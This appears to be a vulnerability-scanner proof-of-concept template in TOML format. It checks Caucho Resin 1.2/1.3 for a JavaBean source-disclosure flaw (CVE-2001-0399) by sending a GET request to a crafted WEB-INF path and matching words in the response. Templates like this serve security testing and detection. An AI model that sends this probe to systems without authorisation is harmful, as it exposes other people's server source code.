[info]
author = "ave"
description = "验证 Caucho Resin 1.2/1.3 系列存在 JavaBean 源码泄露漏洞，攻击者可通过构造恶意 HTTP 请求，绕过 Servlet 容器访问限制，直接读取 JavaBean 文件的源代码"
id = "POC-AVE-2001-0160"
name = "Caucho Technology Resin JavaBean Disclosure PoC"
severity = "medium"
tags = ["ave-2001-0160"]
vuln_id = [
    "CVE-2001-0399",
    "AVE-2001-0160",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/WEB-INF/servlets/.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Caucho Technology Resin",
    "JavaBean",
]
